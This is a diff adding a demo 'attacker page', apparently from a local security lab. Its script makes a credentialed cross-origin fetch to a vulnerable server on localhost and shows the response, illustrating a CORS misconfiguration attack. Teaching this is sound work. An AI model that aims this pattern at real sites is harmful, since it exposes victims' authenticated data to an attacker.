@@ -1,0 +1,16 @@
+<!doctype html>
+<html>
+  <head><meta charset="utf-8"><title>Attacker Page (Demo)</title></head>
+  <body>
+    <h2>Attacker Page (Local Demo)</h2>
+    <p>This page tries to read cross-origin data from the vulnerable server.</p>
+    <div id="result">Fetching...</div>
+
+    <script>
+      fetch('http://localhost:3000/data', { credentials: 'include' })
+        .then(r => r.text())
+        .then(t => { document.getElementById('result').innerHTML = '<pre>' + t + '</pre>'; })
+        .catch(e => { document.getElementById('result').textContent = 'Fetch failed: ' + e; });
+    </script>
+  </body>
+</html>
